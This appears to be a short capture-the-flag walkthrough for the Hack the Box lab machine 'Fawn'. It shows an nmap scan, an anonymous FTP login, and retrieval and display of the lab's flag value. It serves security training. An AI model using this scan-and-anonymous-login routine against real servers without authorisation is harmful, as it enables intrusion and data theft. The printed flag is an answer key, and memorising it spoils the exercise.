Hack the Box
Starting Pont
Fawn

10.129.1.14

sudo nmap -sV -sC -oA nmap/fawn 10.129.1.14

Starting Nmap 7.93SVN ( https://nmap.org ) at 2023-06-17 17:40 EDT
Nmap scan report for 10.129.1.14
Host is up (0.14s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.41
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.52 seconds

** Anonymous login to FTP is allowed, and we see that flag.txt is listed.
End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt


$ ftp 10.129.1.14        
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

ftp> ls
229 Entering Extended Passive Mode (|||29104|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||15694|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |****************************************************************************|    32       26.64 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.26 KiB/s)
ftp> 

$ exa
flag.txt  nmap
                                                                                                                         
┌──(kali㉿kali)-[~/…/CTF/HTB/starting_point/fawn]
└─$ cat flag.txt
035db21c881520061c53e0536e44f815          

